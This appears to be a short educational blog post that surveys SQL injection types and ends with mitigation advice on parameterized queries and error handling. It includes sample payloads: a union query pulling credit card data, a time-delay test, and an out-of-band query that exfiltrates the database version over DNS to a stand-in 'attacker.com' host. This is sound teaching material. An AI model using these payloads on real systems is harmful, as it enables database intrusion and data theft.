---
layout: post
title: "SQLi: overview"
date: 2024-05-14
description: "SQL injection in plain terms: what the flaw lets an attacker read, the query shapes that cause it, and where to look for it."
categories:
  - TIL
tags:
  - SQLi
  - Web
---

## Overview of SQL Injection Types with Examples

SQL Injection is a prevalent vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. More dangerous, however, is the ability to modify or delete this data, and potentially issue commands to the operating system of the server if the SQL database is run with inappropriate privileges.

Here are the primary types of SQL injection and examples of how they can be carried out:

**1. In-Band SQLi (Error-Based SQLi and Union-Based SQLi)**

* **Error-Based SQLi**: This technique involves performing actions that cause the SQL database to throw an error, which is helpful for an attacker to understand the structure of the database.
  * Example: Entering a malformed SQL query that causes the database to throw a detailed error message, such as `SELECT * FROM users WHERE id = 'a'`.
* **Union-Based SQLi**: This type of attack leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.
  * Example: `SELECT name, age FROM users UNION SELECT credit_card_number, expiration_date FROM credit_cards`.

**2. Blind/Inferential SQLi (Boolean-Based SQLi and Time-Based SQLi)**

* **Boolean-Based SQLi**: The attacker sends an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result.
  * Example: Adjusting a statement to check a condition, such as `SELECT * FROM users WHERE username = 'admin' AND 1=1` (true) versus `1=2` (false).
* **Time-Based SQLi**: This attack involves modifying the database query so that its execution will take more time to complete, depending on a specified SQL statement’s condition.
  * Example: `IF (1=1) WAITFOR DELAY '00:00:05'` – if the condition is true, the response will be delayed by 5 seconds, indicating a successful SQL injection.

**3. Out-of-Band SQLi**

* This type of SQLi occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-Band techniques, which rely on the capacity of the server to make DNS or HTTP requests to transfer data to an attacker.
  * Example: Triggering a DNS lookup to a server controlled by an attacker with a query like: `SELECT load_file(concat('\\\\',(SELECT @@version),'.attacker.com\\abc'))`.

**4. Compounded SQLi (SQLi with XSS or SQLi with LFI)**

* Attackers might use SQLi to inject malicious JavaScript, leading to stored XSS, or exploit SQLi to include files from the system (LFI).
  * Example: Inserting a script tag into a database field that is later displayed in user browsers, or manipulating file paths stored in the database to execute or leak files from the server.

Each type of SQL injection has its nuances and requires specific conditions to be exploitable. Effective mitigation involves prepared statements, parameterized queries, and adequate error handling to prevent leakage of sensitive information through error messages. Regular updates and security reviews are also critical to protect against SQL injection attacks.
